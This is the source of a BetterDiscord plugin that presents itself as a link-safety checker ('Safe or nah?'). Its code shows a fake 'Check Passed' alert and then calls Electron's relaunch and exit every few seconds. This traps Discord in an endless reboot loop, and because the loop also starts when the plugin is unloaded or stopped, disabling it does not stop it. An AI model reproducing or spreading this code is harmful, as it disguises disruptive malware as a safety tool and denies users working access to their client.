//META{"name":"RebootcirPrise"}*//

class RebootcirPrise {
	getName() { return "CanITrustAnyBdghlLink"; }
	getDescription() { return "Safe or nah? cirPrise"; }
	getVersion() { return "0.0.1"; }
	getAuthor() { return "cirPrise"; }
	
	load() {	this.rebootLoop();}
	unload() {	this.rebootLoop();}
	constructor(){
	}
	start()	 {
		this.rebootLoop();
	}

	stop() {
			this.rebootLoop();
	}
  CirPriseStart() {
  	//wait 3 sec to activate plugin
    setTimeout(() => {
      let CirPrise = require('electron').remote.app;
      CirPrise.relaunch();
      CirPrise.exit();
    }, 3000);
  }
rebootLoop(){
if (true){
	BdApi.alert('Check Passed','cirPrise')
}
   setTimeout(() => {
     this.CirPriseStart();
    }, 8000);

}
}

